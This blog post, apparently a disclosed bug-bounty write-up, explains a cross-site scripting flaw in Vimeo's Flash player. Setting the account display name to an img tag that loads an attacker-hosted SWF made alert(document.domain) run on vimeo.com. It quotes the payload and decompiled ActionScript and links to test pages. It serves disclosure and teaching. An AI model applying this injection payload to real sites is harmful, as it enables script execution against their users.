---
layout: post
title: "XSSing Flash without user interaction"
---
_Just to clarify: the point of this post is to understand why is better to not use `allowscriptaccess` set to `always` when embedding a Flash file in a document, and it's not about XSSing Flash loading a file directly in the browser because in that case the third party files are sandboxed._

Looking for bugs on [Vimeo](https://hackerone.com/vimeo) I found out that they embed the Flash file <https://f.vimeocdn.com/p/flash/hubnut/2.0.12/hubnut.swf> with `allowscriptaccess` set to `always` at this endpoint <https://vimeo.com/hubnut/user/user36690798>. This Flash file is used to show the videos uploaded by the user indicated (_user36690798_ in this case).

If you [look at the source of the endpoint](view-source:https://vimeo.com/hubnut/user/user36690798) you notice that there is a `var config` which contains information about the user, including the name (which appears as the value of `display_name`). This variable is loaded by the Flash file who puts the value of `display_name` in a `TextField()` using the setter `.text` and, because they apply a style sheet to the `TextField()`, the content [is interpreted as HTML](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/text/TextField.html#text) like using `.htmlText`.

An extract of the code of the class _Carousel_ from the file _hubnut.swf_:
{% highlight js %}
...
this.selectedLabel.styleSheet = _loc2_;
...
// Here "display_name" appears as "_loc4_.owner.display_name"
_loc13_ = _loc13_ + (_loc4_.owner.url?"<h2>by <a href=\"//" + this.data.request.vimeo_url + "/" + _loc4_.owner.url_name + "\" target=\"_blank\">" + _loc4_.owner.display_name + "</a></h2>":"<h2>by <strong>" + _loc4_.owner.display_name + "</strong></h2>");
...
this.selectedLabel.text = _loc13_;
...
{% endhighlight %}

Now, the value of `display_name` is being encoded as HTML entities, but it was not the case 2 months ago (I think that they were escaping as JSON, for instance `/` was being escaped as `\/`). So, it was possible to put HTML code but Flash doesn't interpret every HTML tag as valid. Which one is the widely used for this case? `<a>`, yes, but the problem is that you have a limit of 32 characters for your name in Vimeo and for me wasn't enough to make a valid proof of concept. With this scenario I decided to read [which HTML tags are interpreted by Flash](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/text/TextField.html#htmlText) and noticed this about the `<img>` tag:

> src: Specifies the URL to an image or SWF file

Sounds promising! Anyway, at first I thought that maybe Flash loaded the file in a sandbox to disallow execution of Javascript code but I continued the testing. I uploaded a Flash file to my server which executed `ExternalInterface.call("alert(document.domain)");` and changed my name to `<img src="//u00f1.xyz/xss.swf">`. Reloaded <https://vimeo.com/hubnut/user/user36690798> and for my surprise `alert(document.domain)` was executed on **vimeo.com** without user interaction.

After successfully execute Javascript using an `<img>` tag, I went to check if it was possible to do the same but in cases where you can provide the URL of an image that is shown using Flash, and I confirmed that it is possible. What I mean is that if, for example, Vimeo allowed to put any URL as the thumbnail of the video, you could provide an URL to a Flash file of yours with Javascript code and it would probably load the file and execute the Javascript code.

You can test the issue using the `<img>` tag [here](http://esevece.github.io/code/XssImage.html?file=https%3A%2f%2fgithub.com%2fesevece%2fesevece.github.io%2fblob%2fmaster%2fcode%2fxss.swf%3Fraw%3Dtrue&asHtml=true&asObject=false) and the issue when you can provide the URL of an image [here](http://esevece.github.io/code/XssImage.html?file=https%3A%2f%2fgithub.com%2fesevece%2fesevece.github.io%2fblob%2fmaster%2fcode%2fxss.swf%3Fraw%3Dtrue&asHtml=false&asObject=false).
This code is available at <https://github.com/esevece/esevece.github.io/tree/master/code>.  

The report [is publicly disclosed on HackerOne](https://hackerone.com/reports/87577) thanks to Vimeo.
